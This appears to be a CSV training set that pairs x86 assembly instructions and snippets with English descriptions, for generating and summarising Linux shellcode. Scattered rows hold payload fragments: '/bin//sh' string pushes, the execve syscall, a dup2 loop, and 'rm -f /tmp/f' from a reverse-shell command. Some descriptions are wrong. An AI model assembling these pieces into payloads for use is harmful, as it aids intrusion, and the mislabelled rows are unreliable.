input_text,target_text
"ShellCodeSum: sub ax, 1662",subtract 1662 from the contents of ax register and save the result in ax
ShellCodeGen: subtract the contents of dl register from the contents of cl register and save the result in cl,"sub cl, dl"
"ShellCodeSum: push byte 0x2 \n mov ecx, esp",push the byte 0x2 onto the stack and point ecx to the stack register
"ShellCodeSum: mov [esp+58], ah",move ah into the address [esp+58]
ShellCodeGen: move decimal number 3 into ebx,"mov ebx, 3"
ShellCodeGen: negate eax,neg eax
ShellCodeGen: if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2,"cmp cl, 12 \n jge l2"
ShellCodeGen: define the callme label,callme:
ShellCodeGen: define the _start label,_start:
ShellCodeGen: subtract the contents of the ax register by 1662,"sub ax, 1662"
ShellCodeSum: mul ebx,multiply the contents of eax by ebx
"ShellCodeSum: mov al, 99",move 99 into al
ShellCodeGen: system call close,"mov eax, 6"
ShellCodeSum: jmp l20,jump to label l20
ShellCodeGen: move 21 into cl,"mov cl, 21"
ShellCodeGen: push the word 0x662d onto the stack and point the ecx register to the stack register,"push word 0x662d \n mov ecx, esp"
ShellCodeSum: je continue,if equal jump to label continue
ShellCodeSum: jmp fupdisasm+3,jump to the address specified by the operation fupdisasm+3
ShellCodeGen: push 0x69622f65 onto the stack,push 0x69622f65
ShellCodeGen: move the value one into eax,"mov eax, 1"
ShellCodeGen: if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register,"cmp al, 0xf2 \n je _start \n mov eax, 0x50905090"
ShellCodeSum: jmp short read,jump short to the read label
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register,"cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD"
ShellCodeGen: allocate one byte of memory for a_letter variable and initialize it to 'd',a_letter db 'd'
ShellCodeSum: inc eax,increment the contents of the eax register
ShellCodeGen: compare the word at the address ecx and 0x5951,"cmp word [ecx], 0x5951"
ShellCodeSum: ret,return
ShellCodeGen: subtract ebx from eax,"sub eax, ebx"
ShellCodeGen: store 78 decimal into edx,"mov edx, 78"
ShellCodeGen: compare if ecx is zero,"cmp ecx, 0"
ShellCodeGen: move 0x2 into ebx,"mov ebx, 0x2"
ShellCodeGen: move 0x3 into bl,"mov bl, 0x3"
ShellCodeGen: jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \n l1 IncAddr \n jmp edi
"ShellCodeSum: mov cl, bl \n sub cl, 1 \n jnz loop",move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
ShellCodeGen: push 0x66 to the stack,push 0x66
"ShellCodeSum: cmp bl, 0xaa \n je shellcode",jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
ShellCodeSum: jz 0x8,jump to 0x8 if zero
"ShellCodeSum: test bl, bl \n jz not_found",jump to the label not_found if the contents of the bl register is not zero
ShellCodeSum: pop ecx,restore ecx register
ShellCodeGen: jump to 0x8 if zero,jz 0x8
ShellCodeGen: move 23 into al,"mov al, 23"
ShellCodeSum: push offset printf_msg,push address of string print_msg
ShellCodeGen: push the byte 0x7 onto the stack and point edx to the stack register,"push byte 0x7 \n mov edx, esp"
ShellCodeGen: perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx,"xor ebx, word __flag_byte"
"ShellCodeSum: add esi, 4",add 4 to the contents of the esi register
ShellCodeSum: jmp _while_loop,jump to the _while_loop label
"ShellCodeSum: mov ecx, [esi+4*eax]",move the 4 bytes of data at address esi+4*eax into ecx
ShellCodeSum: push byte 0x2e,push the byte 0x2e onto the stack
ShellCodeGen: close,"mov eax, 6"
"ShellCodeSum: lea ecx, [zero_reg+117]",load the effective address [zero_reg+117] into ecx
ShellCodeGen: add 10 to the contents of eax,"add eax, 10"
ShellCodeGen: jump to the shellcode label,jmp shellcode
ShellCodeGen: if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register,"test eax, eax \n jz close \n mov ebx, edx"
ShellCodeGen: perform and operation on the variable mask1 and 128,"and mask1, 128"
ShellCodeSum: buffersize: dw 1024,declare buffersize to be a word containing 1024
ShellCodeGen: swap the contents of the ebx register with the contents of the edx register,"xchg ebx, edx"
ShellCodeGen: push 0x29 onto the stack,push 0x29
ShellCodeGen: get the process ID,"mov eax, 20"
"ShellCodeSum: add esi, eax",add the contents of the eax register to the contents of esi register
"ShellCodeSum: xor ecx, ecx",zero out ecx
ShellCodeGen: push the 0x682f2f2f value onto the stack,push 0x682f2f2f
ShellCodeSum: write:,declare the write label
ShellCodeSum: jmp short 0x2c,jump short to 0x2c
ShellCodeGen: define execfile function,execfile:
"ShellCodeSum: sub ax, 1564",subtract 1564 from the contents of ax register and save the result in ax
ShellCodeGen: init the esi register to 0,"xor esi, esi"
"ShellCodeSum: mov cx, word_table[3]",move the 4th element of the array word_table into cx
ShellCodeGen: push the 0x6e69622f onto the stack,push 0x6e69622f
ShellCodeGen: push the dword 0x64777373 onto the stack,push dword 0x64777373
ShellCodeSum: inc edx,increment the contents of the edx register
ShellCodeGen: if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label,"cmp bl, 0xaa \n je shellcode"
"ShellCodeSum: mov edx, readlen",move readlen into edx
ShellCodeGen: push the word 0x3582 onto the stack,push word 0x3582
ShellCodeGen: move 0x7 into bl,"mov bl, 0x7"
ShellCodeSum: push byte 0x04 \n pop eax,put the syscall 0x04 into the eax register
ShellCodeGen: load the effective address of the operation bp+0x0b] into the bx register,"lea bx, [bp+0x0b]"
"ShellCodeSum: mov edx, ecx",move ecx to edx
ShellCodeGen: define the numeric label 3,3:
"ShellCodeSum: add eax, 40000h",add 40000h to eax register
ShellCodeSum: push 0x68736164,push 0x68736164 to the stack
"ShellCodeSum: push word 0x632d \n mov eax, esp",push the word 0x632d onto the stack and point the eax register to the stack register
ShellCodeGen: decrement the edx register by one,dec edx
"ShellCodeSum: mov eax, 1",terminate the process
ShellCodeGen: push the 0x682d onto the stack,pushw 0x682d
"ShellCodeSum: mov ah, 0x80",move 0x80 into ah
"ShellCodeSum: mov byte [esi+11], al",move al into the byte at address [esi+11]
ShellCodeGen: divide the contents of eax by the contents of ebx,div ebx
ShellCodeGen: push 0x69622f2f to the stack,push 0x69622f2f
ShellCodeGen: declare the decrypt label,decrypt:
ShellCodeSum: push byte 0x04,push the byte 0x04 onto the stack
"ShellCodeSum: lea ecx, [zero_reg+3]",load the effective address of the result of the operation [zero_reg+3] into the ecx register
ShellCodeSum: jmp short todo,jump short to the todo label
ShellCodeGen: jump to the _dup2_loop label if the previous instruction clears the sign flag,jns _dup2_loop
ShellCodeGen: push the 0x69622f65 onto the stack,push 0x69622f65
ShellCodeGen: decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register,loopnz next \n jmp ecx
ShellCodeGen: push 0x81e3a8c0 onto the stack,push 0x81e3a8c0
ShellCodeGen: move the contents of the esi register into the long starting at the address [esi+18],"mov long [esi+18], esi"
"ShellCodeSum: mov eax, ebx",move the address in ebx into eax
ShellCodeGen: system call execve,"mov eax, 11"
ShellCodeGen: create the doubleword variable var_a in memory and initialize it to zero,var_a: dd 0x0
ShellCodeGen: pop the top element of the stack into memory at the four bytes starting at location eax,pop [eax]
"ShellCodeSum: shr eax, 28",right shift the contents of eax register by 28 bit positions
"ShellCodeSum: mov [ebp+12], ecx",move ecx into the address [ebp+12]
ShellCodeSum: push word 0xc005,push the word 0xc005 onto the stack
"ShellCodeSum: mov eax, 13",invoke sys_time
ShellCodeSum: jz exit,jump to the exit label if the zero flag is set
ShellCodeSum: fupdisasm:,define fupdisasm function
ShellCodeGen: decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label,loop decode \n jmp Shellcode
"ShellCodeSum: mov esi, 0x735f6176",move 0x735f6176 into esi
ShellCodeGen: compare the doubleword stored at memory location var to the integer value 10,"cmp dword [var], 10"
ShellCodeGen: decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative,dec ecx \n jns 2f_loop
"ShellCodeSum: cmp byte [esi], 0xD \n jle wrap_around",jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
ShellCodeGen: define the byte string 'rm -f /tmp/f',db 'rm -f /tmp/f'
ShellCodeGen: load the effective address of the operation [bp+di+0x3e] into the dx register,"lea dx, [bp+di+0x3e]"
ShellCodeGen: move 0x30 into al,"mov al, 0x30"
ShellCodeSum: call near stageaddress,call the near function
ShellCodeSum: push ebx,push ebx onto the stack
ShellCodeGen: subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative,"sub dl, 5 \n jns l4"
ShellCodeGen: delcare the dup2loop label,dup2loop:
"ShellCodeSum: lea ebx, [esp]",load the effective address of esp into ebx
"ShellCodeSum: xor ecx, ecx \n cmp ebx, ecx \n je l1",zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register
ShellCodeGen: move a byte from the address buff+ecx into al,"mov al, byte[buff+ecx]"
ShellCodeSum: push 0x752f2f2f,push 0x752f2f2f onto the stack
ShellCodeGen: push 0x1 onto the stack,push 0x1
ShellCodeGen: move the memory address of filecontents variable into eax,"mov eax, filecontents"
ShellCodeGen: push edx to the stack,push edx
"ShellCodeSum: mov ecx, ebp",move ebp into ecx
ShellCodeSum: int 80h,make kernel call to exit program
"ShellCodeSum: push word 1 \n mov eax, esp",push the word 1 onto the stack and point eax to the stack register
"ShellCodeSum: mov ax, bx",move bx into ax
ShellCodeGen: compare ecx with 0h,"cmp ecx, 0h"
ShellCodeGen: push the 0x74756f2f onto the stack,push 0x74756f2f
ShellCodeSum: pop ebx,restore the top of the stack into ebx register
ShellCodeSum: call esi,call the esi function
ShellCodeSum: pop ebp,restore the top of the stack into the ebp register
ShellCodeGen: push 0x31313131 onto the stack,push 0x31313131
ShellCodeSum: filecontents: resb 128,reserve filecontents variable of 128 bytes
ShellCodeGen: call the function in esp,call [esp]
"ShellCodeSum: xor ax, 0x4f73",perform the xor operation between the ax register and the value 0x4f73
ShellCodeGen: put the syscall 8 into the eax register,push byte 8 \n pop eax
ShellCodeSum: jz short loc_402b13,if 0 then jump to loc_402b13
ShellCodeGen: define a string db and initialize to 'hello world!',"contents db 'hello world!', 0h"
ShellCodeGen: push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register,"push 0x6e69622f \n push 0x7273752f \n mov eax, esp"
ShellCodeGen: declare global _start,global _start
ShellCodeGen: invoke subroutine accept,"mov ebx, 5"
"ShellCodeSum: xor edx, edx",zero out edx
"ShellCodeSum: push 0x2f2f2f2f \n mov esi, esp",push the value 0x2f2f2f2f onto the stack and point esi to the stack register
ShellCodeGen: push the 0x6e onto the stack,push 0x6e
ShellCodeGen: jump to the numeric label 1 if the zero flag is cleared,jnz 1
"ShellCodeSum: sub eax, 0x013ffeff",subtract 0x013ffeff from the contents in eax and save the result in eax
ShellCodeGen: jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270,"cmp DWORD [edx], 0x636f7270 \n je while"
ShellCodeGen: move esp into ecx,"mov ecx, esp"
"ShellCodeSum: mov eax, 5",open the file
ShellCodeSum: jne _nex,if not equal jump to the _nex label
ShellCodeGen: reserve 1 word for variableName2,variablename2: resw 1
ShellCodeSum: push edx,push edx on the stack
ShellCodeGen: push the dword 0x68732f63 onto the stack,push dword 0x68732f63
ShellCodeSum: push byte +0xb,push the byte +0xb onto the stack
ShellCodeGen: push bx to the stack,push bx
"ShellCodeSum: mov al, 0x4",move 0x4 into al
"ShellCodeSum: add edx, 16",set edx to next 16 byte block
ShellCodeGen: define call_shellcode label,call_shellcode:
"ShellCodeSum: mov al, byte [esi]",move the byte at the address [esi] into al
ShellCodeSum: section .text,declare code section
ShellCodeGen: push '//sh' onto the stack,push '//sh'
ShellCodeGen: declare section containing uninitialized data,section .bss
ShellCodeGen: move the byte at the address 3h into al,"mov al, byte 3h"
ShellCodeSum: jz next_cycle,jump to the next_cycle label if the zero flag is set
ShellCodeGen: push the word 0x7065 onto the stack,push word 0x7065
ShellCodeGen: invoke sys_time,"mov eax, 13"
ShellCodeSum: next_page:,declare next_page function
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register,"cmp DWORD [eax], edx \n jne loop \n jmp eax"
"ShellCodeSum: mov bl, byte [digits+ebx]",move the byte at address digits+ebx into bl
"ShellCodeSum: mov byte [ecx+92], dl",move dl into the single byte at the address stored in ecx+92
ShellCodeGen: push 0bh onto the stack,push 0bh
ShellCodeSum: jmp ecx,jump to ecx
ShellCodeSum: call _myfunc,call the _myfunc function
ShellCodeGen: push the contents of the ebx register onto the stack and point ecx to the stack register,"push ebx \n mov ecx, esp"
ShellCodeGen: make the system call to install the signal handler,"mov eax, 48"
ShellCodeSum: read:,declare the read label
ShellCodeGen: define the cmd label,cmd:
"ShellCodeSum: cmp al, 0xf2",compare the contents of the al register with the value 0xf2
"ShellCodeSum: z dd 1, 2, 3",declare three doubleword values initialized to 1 2 and 3 at address z
ShellCodeGen: move doublewords from the stack into the 32 bit registers,popad
ShellCodeGen: declare bss section,section .bss
ShellCodeSum: shift_decode:,declare the shift_decode label
ShellCodeGen: move 8h into ax,"mov ax, 8h"
ShellCodeGen: push the double word 2 onto the stack,push dword 0x2
"ShellCodeSum: xor eax, eax",init eax 0
ShellCodeGen: move 0x169 into ax,"mov ax, 0x169"
"ShellCodeSum: mov al, cl",move cl into al
"ShellCodeSum: mov edx, ebp",move ebp into edx
ShellCodeGen: add ax to bx,"add bx, ax"
"ShellCodeSum: shl edx, 24",left shift the contents of the edx register by 24 bits
ShellCodeGen: specify exit syscall,"mov eax, 1"
ShellCodeSum: push word 0x6666,push the word 0x6666 onto the stack
